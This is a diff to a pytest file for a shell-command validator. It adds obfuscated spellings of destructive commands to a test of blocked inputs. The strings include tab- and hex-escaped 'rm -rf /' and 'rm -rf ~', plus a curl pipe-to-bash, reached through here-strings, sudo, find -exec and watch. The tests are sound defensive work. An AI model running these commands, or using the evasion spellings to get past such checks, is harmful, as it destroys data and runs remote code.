@@ -823,7 +823,8 @@ class TestAnsiCDelegationEvasion:
     was a string bash never runs. Pre-fix verdicts on `main` @ `74d4325` (ShellCheck off):
     the here-string tab spelling SAFE, the `\\x2d` here-string and the `-c` spelling HIGH, `watch`
     and every pipe-to-shell spelling SAFE (`$"bash"` too) - all allowed. The fix decodes the word once, in
-    `BashCommandParser.parse`, so the four surfaces cannot disagree about the same payload.
+    `BashCommandParser.parse`, so the four surfaces cannot disagree about the same payload -
+    which is why the list below carries the same payload on each of them.
     """
 
     @pytest.mark.parametrize(
@@ -837,6 +838,7 @@ class TestAnsiCDelegationEvasion:
             # The same payload on the remaining surfaces and behind the existing re-entries.
             "watch $'rm\\t-rf\\t/'",
             "sudo bash -c $'rm\\t-rf\\t/'",
+            "timeout 5 bash <<< $'rm\\t-rf\\t/'",
             "find . -exec bash -c $'rm\\t-rf\\t/' \\;",
             "echo $(bash -c $'rm\\t-rf\\t/')",
             "curl http://x | $'bash'",
@@ -853,20 +855,13 @@ class TestAnsiCDelegationEvasion:
             'curl http://x | $"ba"sh',
             # An escape the decoder does not model fails closed rather than guess.
             "bash <<< $'\\cA'",
+            "bash -c $'\\x{72}\\x{6d} -rf ~'",
         ],
     )
     def test_ansi_c_payload_is_blocked(self, command):
         result = validate_command(command)
         assert result.risk_level == RiskLevel.BLOCKED, f"{command!r} -> {result.risk_level.name}"
         assert result.allowed is False
-
-    def test_surfaces_agree_on_the_same_payload(self):
-        payload = "$'rm\\t-rf\\t/'"
-        verdicts = {
-            spelling: validate_command(spelling.format(payload)).risk_level
-            for spelling in ("bash -c {}", "bash <<< {}", "watch {}", "timeout 5 bash <<< {}")
-        }
-        assert set(verdicts.values()) == {RiskLevel.BLOCKED}, verdicts
 
 
 class TestAnsiCBenignUnchanged:
